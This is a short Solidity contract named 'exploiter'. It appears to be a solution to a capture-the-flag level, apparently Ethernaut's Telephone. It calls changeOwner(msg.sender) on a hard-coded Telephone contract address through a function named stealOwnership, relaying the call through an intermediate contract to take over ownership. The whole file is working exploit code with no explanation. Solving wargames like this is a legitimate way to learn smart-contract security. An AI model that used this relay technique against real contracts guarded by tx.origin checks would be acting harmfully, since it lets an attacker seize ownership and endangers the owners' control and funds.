pragma solidity ^0.6.0;

import "./Telephone.sol";

contract exploiter{

    Telephone instance = Telephone(0x6052d3693e024ee24bD7Ae1FEdE38bf209e82619);
    
    function stealOwnership() public {
        instance.changeOwner(msg.sender);
    }

}